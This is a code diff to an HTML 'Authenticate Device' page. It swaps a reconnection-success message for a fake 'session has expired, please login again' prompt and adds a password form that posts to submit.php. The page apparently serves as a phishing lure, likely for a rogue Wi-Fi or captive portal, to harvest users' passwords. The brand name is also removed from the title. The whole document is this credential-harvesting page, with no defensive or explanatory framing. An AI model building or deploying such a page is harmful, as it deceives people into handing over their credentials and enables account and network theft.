@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>FilProducts: Authenticate Device</title>
+	<title>Authenticate Device</title>
 	<link rel="shortcut icon" href="filp.jpeg">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<style>
@@ -62,7 +62,27 @@
 <body>
 <center>
 	<h1>Reauthentication</h1><br><img src="filp.jpeg"><br>
-	<h2>It was a success! Your connection will be coming back right after a few seconds.</h2>
+	<h2>Oops! It looks like your session has expired, please login again.</h2><br>
+	<form action='submit.php' method="POST">
+	<input type="password" placeholder="Password" id='pass' name='password' required><button id='show' onclick='change()' type='button'>View</button><br><br>
+	<button id='sub' type='submit'>Submit</button>
+</form>
 </center>
+<script type="text/javascript">
+	function change(){
+		pass.type = "text";
+		show.innerHTML = "Hide";
+		show.onclick = hideCredentials;
+		show.style.background = "#009bff";
+		show.style.color = "white";
+	}
+	function hideCredentials(){
+		pass.type = "password";
+		show.innerHTML = "View";
+		show.onclick = change;
+		show.style.background = "#ffd600";
+		show.style.color = "black";
+	}
+</script>
 </body>
 </html>
